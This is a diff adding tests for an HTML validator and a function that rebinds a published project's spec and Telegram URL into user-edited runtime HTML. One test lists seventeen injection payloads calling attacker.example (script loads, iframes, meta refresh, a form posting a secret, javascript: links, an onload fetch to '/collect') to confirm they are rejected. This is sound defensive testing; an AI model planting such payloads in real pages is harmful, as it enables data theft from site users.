@@ -20,7 +20,11 @@ registerHooks({
 
 const { compileProject } = await import("../lib/project-compiler.ts");
 const { createProjectSpec } = await import("../lib/project-factory.ts");
-const { prepareEditableRuntimeHtml, validateEditableRuntimeHtml } = await import(
+const {
+  bindPublishedRuntimeHtml,
+  prepareEditableRuntimeHtml,
+  validateEditableRuntimeHtml,
+} = await import(
   "../lib/source-workspace.ts"
 );
 
@@ -67,6 +71,70 @@ test("source workspace removes loopback origins without breaking Studio-local as
   });
 });
 
+test("edited runtime binding preserves edits while replacing every Studio service slug", () => {
+  const { spec, html } = project();
+  const publicSpec = {
+    ...spec,
+    slug: "public-radio-111111111111111111111111",
+    dataEndpoint: "https://drops.example/api/public-data",
+  };
+  const edited = html.replace(
+    "</body>",
+    '<aside data-user-edit="true">Keep this source edit</aside></body>',
+  );
+  const rebound = bindPublishedRuntimeHtml(edited, publicSpec);
+  const embedded = rebound.match(
+    /<script type="application\/json" id="projectSpec">([\s\S]*?)<\/script>/,
+  );
+  assert.ok(embedded);
+  assert.equal(JSON.parse(embedded[1]).slug, publicSpec.slug);
+  assert.equal(JSON.parse(embedded[1]).dataEndpoint, publicSpec.dataEndpoint);
+  assert.match(rebound, /data-user-edit="true"/);
+  assert.match(
+    rebound,
+    new RegExp(`var studioTelegramUrl="https://drops\\.example/\\?connections=1&provider=dropsbot&flow=telegram-channel&project=${publicSpec.slug}"`),
+  );
+  assert.deepEqual(validateEditableRuntimeHtml(publicSpec, rebound), {
+    valid: true,
+    issues: [],
+  });
+});
+
+test("edited runtime binding treats Telegram URL replacement markers literally", () => {
+  const { spec, html } = project();
+  const publicSpec = {
+    ...spec,
+    slug: "public-radio-replacement-proof",
+    dataEndpoint: "https://drops$&.example/api/public-data",
+  };
+  const rebound = bindPublishedRuntimeHtml(html, publicSpec);
+
+  assert.match(
+    rebound,
+    /var studioTelegramUrl="https:\/\/drops\$&\.example\/\?connections=1&provider=dropsbot&flow=telegram-channel&project=public-radio-replacement-proof";/,
+  );
+  assert.doesNotMatch(rebound, /var studioTelegramUrl=https:\/\/dropsvar studioTelegramUrl=/);
+});
+
+test("edited runtime binding fails closed when a compiler-owned bridge value is missing", () => {
+  const { spec, html } = project();
+  const publicSpec = { ...spec, slug: "public-radio-safe" };
+  assert.throws(
+    () => bindPublishedRuntimeHtml(
+      html.replace('<script type="application/json" id="projectSpec">', "<script>"),
+      publicSpec,
+    ),
+    /exactly one generated projectSpec payload/,
+  );
+  assert.throws(
+    () => bindPublishedRuntimeHtml(
+      html.replace(/\bvar studioTelegramUrl=("(?:\\.|[^"\\])*");/, ""),
+      publicSpec,
+    ),
+    /generated Telegram handoff binding/,
+  );
+});
+
 test("source workspace blocks secrets, evaluators, loopback dependencies and removed contracts", () => {
   const { spec, html } = project();
   const unsafe = html
@@ -75,4 +143,38 @@ test("source workspace blocks secrets, evaluators, loopback dependencies and rem
   const result = validateEditableRuntimeHtml(spec, unsafe);
   assert.equal(result.valid, false);
   assert.match(result.issues.join(" "), /product-kind|eval|loopback|secret/i);
+});
+
+test("source workspace rejects extra active content while preserving the generated JSON payload", () => {
+  const { spec, html } = project();
+  assert.match(html, /<script type="application\/json" id="projectSpec">/);
+
+  const attacks = [
+    '<script src="https://attacker.example/steal.js"></script>',
+    '<!--><script src="https://attacker.example/comment-break.js"></script>-->',
+    '<script type="importmap">{"imports":{"x":"https://attacker.example/x.js"}}</script>',
+    '<iframe src="https://attacker.example/collect"></iframe>',
+    '<object data="https://attacker.example/collect"></object>',
+    '<embed src="https://attacker.example/collect">',
+    '<base href="https://attacker.example/">',
+    '<link rel="modulepreload" href="https://attacker.example/module.js">',
+    '<link rel="preload" as="script" href="https://attacker.example/app.js">',
+    '<link rel="preconnect" href="https://attacker.example">',
+    '<link rel="dns-prefetch" href="//attacker.example">',
+    '<link rel="stylesheet" href="https://attacker.example/app.css">',
+    '<meta http-equiv="refresh" content="0;url=https://attacker.example/collect">',
+    '<form action="https://attacker.example/collect"><input name="secret"></form>',
+    '<input formaction="javascript:location=\'https://attacker.example/\'">',
+    '<a href="javascript:location=\'https://attacker.example/\'">Open</a>',
+    '<img src="/brand/dropstab-mark.svg" onload="fetch(\'https://attacker.example/collect\')">',
+  ];
+
+  for (const attack of attacks) {
+    const result = validateEditableRuntimeHtml(
+      spec,
+      html.replace("</body>", `${attack}</body>`),
+    );
+    assert.equal(result.valid, false, attack);
+    assert.match(result.issues.join("\n"), /active[- ]content|outbound form/i, attack);
+  }
 });
